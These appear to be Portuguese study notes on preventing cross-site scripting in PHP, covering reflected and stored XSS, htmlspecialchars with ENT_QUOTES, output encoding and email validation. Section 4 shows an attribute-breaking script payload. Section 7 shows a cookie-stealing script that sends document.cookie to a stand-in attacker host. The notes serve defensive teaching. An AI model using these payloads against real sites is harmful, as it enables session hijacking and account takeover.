### 1. Conceituação OWASP (XSS)

```SQL
XSS significa Cross-Site Scripting. É classificada como uma vulnerabilidade no lado do cliente (Client-Side) porque o código malicioso (geralmente JavaScript) é executado no navegador da vítima. No entanto, ela deve ser prevenida pelo Back-End porque é o servidor quem recebe, armazena e devolve os dados dinâmicos. Se o Back-End não higienizar ou codificar essas saídas, ele entregará o script malicioso diretamente no HTML da página para o navegador interpretar.
```
---

### 2. Reflected vs Stored XSS 
```SQL

XSS Refletido (Reflected): O código malicioso vem na própria requisição (ex: link por e-mail ou URL com busca) e o servidor o exibe na hora. O atacante precisa enganar a vítima para ela clicar no link.

XSS Gravado (Stored): O código malicioso é salvo diretamente no banco de dados (ex: comentário, perfil) e executa automaticamente para qualquer um que abrir a página.

Mais perigoso: XSS Gravado (Stored). Ele não depende do usuário clicar em um link específico; basta acessar a página infectada para ser atacado, podendo atingir centenas ou milhares de pessoas de uma só vez.

```

### 3. Mecanismo de Escapamento 
```SQL
A função transforma caracteres que têm significado especial no HTML em "entidades HTML" puramente visuais.

O sinal < vira &lt; (less than).

O sinal > vira &gt; (greater than).
Quando o navegador lê o HTML e encontra &lt;script&gt;, ele entende que deve desenhar o texto "" na tela para o usuário ler, em vez de interpretar aquilo como a abertura de uma tag executável. A instrução deixa de ser código e vira mero texto decorativo.
```
---
 ### 4. Flags de Proteção: o Papel do **`ENT_QUOTES`**:
 ```SQL
### 4. Flags de Proteção: O Papel do `ENT_QUOTES`

* **Função da flag:** Instruir a função `htmlspecialchars()` a converter tanto aspas duplas (`"`) em `&quot;` como aspas simples (`'`) em `&#039;`.
* **Risco de omissão em `<input value="...">`:** Por padrão no PHP 8.1+, as aspas duplas já são convertidas, mas se a flag for omitida ou desativada numa tag delimitada por aspas simples (ex.: `value='...'`), um atacante pode injetar uma aspa para **fechar precocemente o atributo** `value`. 
* **Exemplo de ataque:** Ao enviar `"><script>alert(1)</script>`, o navegador fecha o atributo `value`, fecha a tag `<input>` e executa a tag `<script>` maliciosa contida logo a seguir.
 ```

 ### 5. Anti-Alucinação PHP: O Fim do `FILTER_SANITIZE_STRING`

* **Motivo da inutilização:** O filtro foi depreciado no PHP 8.1 e totalmente **removido no PHP 8.2+**.
* **Problema técnico:** Tentava limpar o texto removendo tags de forma ineficiente, corrompendo dados legítimos (como a string `a < b`) e transmitindo uma falsa sensação de segurança.
* **Boa prática moderna:** Manter o dado original no banco e aplicar o escapamento contextual na saída (*output encoding*) na hora de exibir.
---

### 6. Validação de E-mail: `empty()` vs `filter_var()`

* **`empty($email)`:** Apenas checa se a variável está vazia, nula ou com valor falso. Aceitaria textos completamente inválidos como `"12345"` ou `"usuario"`.
* **`filter_var($email, FILTER_VALIDATE_EMAIL)`:** Valida a estrutura real do endereço com base nos padrões RFC (presença de `@`, domínio válido e caracteres permitidos).

---

### 7. Roubo de Sessão via XSS

* **Como funciona o ataque:** O atacante injeta um script como `<script>fetch('https://site-hacker.com/roubar?c=' + document.cookie)</script>`.
* **O impacto:** Quando a vítima acede à página, o navegador executa o script e envia o cookie de sessão (`PHPSESSID`) para o servidor do atacante, permitindo que este personifique a conta da vítima sem precisar de saber a palavra-passe.
---

### 8. Segurança em Camadas: Entrada vs Saída

* **Por que sanitizar na entrada não basta:** Remover tags na entrada (`strip_tags`) altera o dado original e pode falhar dependendo do contexto de exibição final.
* **A necessidade do `htmlspecialchars()` na saída:** O contexto de saída dita a regra de segurança. Escapar os dados na hora da exibição garante que a informação seja tratada com segurança exatamente no local onde é renderizada, sem danificar a integridade do banco de dados.




